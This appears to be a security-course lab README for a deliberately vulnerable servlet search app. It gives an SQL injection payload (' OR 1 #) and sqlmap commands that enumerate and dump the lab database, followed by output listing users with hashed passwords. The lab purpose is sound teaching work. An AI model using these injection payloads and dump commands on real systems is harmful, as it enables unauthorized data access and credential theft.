Servlet: Search
-------------------------------------------------------------------------------

How to access the Web application from a browser?
-------------------------------------------------------------------------------

URL: http://lab.se.org:8080/Servlet-Search/


How to access the Web application from cURL?
-------------------------------------------------------------------------------

$ curl -i -X GET "http://localhost:8080/Servlet-Search/controller?username=bart&action=Search"
    
		
How to attack the Web application?
-------------------------------------------------------------------------------
name= "' OR 1 #"
http://localhost:8080/Servlet-Search/controller?username=%27+OR+1+%23&action=Search

$ curl -i -X GET "http://localhost:8080/Servlet-Search/controller?username=%27+OR+1+%23&action=Search"


How to use sqlmap to attack this Web application?
-------------------------------------------------------------------------------
Here we use sqlmap from Kali Linux:

$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search"
		
$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" --tables
		
$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --columns

$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --schema

$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --count

$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump

If we need want to use an interception proxy, we type:

$ python sqlmap.py --proxy=http://localhost:8010 -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump

Database: testdb
Table: user
[6 entries]
+----+----------+----------+----------------------------------------------+------------+
| id | username | lastname | password                                     | firstname  |
+----+----------+----------+----------------------------------------------+------------+
| 1  | homer    | Simpson  | Kqq3lbODaQT4LvxsoihdknrtdSBiFOHaODQY65DJBS8= | Homer      |
| 2  | marge    | Simpson  | tLgR+kBQUymuhx5S8DUnw3IMmvf7hgeBllhTXFSExB4= | Marge      |
| 3  | bart     | Simpson  | lVHa2/dqJ0V5RucNGuvr4hMvjTvOY3jSFsEYU1JN06Y= | Bart       |
| 4  | lisa     | Simpson  | 2E/n4HvtsifP//EACRUdlvyUT2ob03z/YOjkYmoescM= | Lisa       |
| 5  | magie    | Simpson  | quW+X2R0kEtob2OeD8/SvkQBIc2In6OBqUtxdQdYNF4= | Maggie     |
| 6  | monty    | Burns    | +OsxFkIi1zQuErlJ5D+0zF5r8t46FvxITh4E0HjeLOo= | Montgomery |
+----+----------+----------+----------------------------------------------+------------+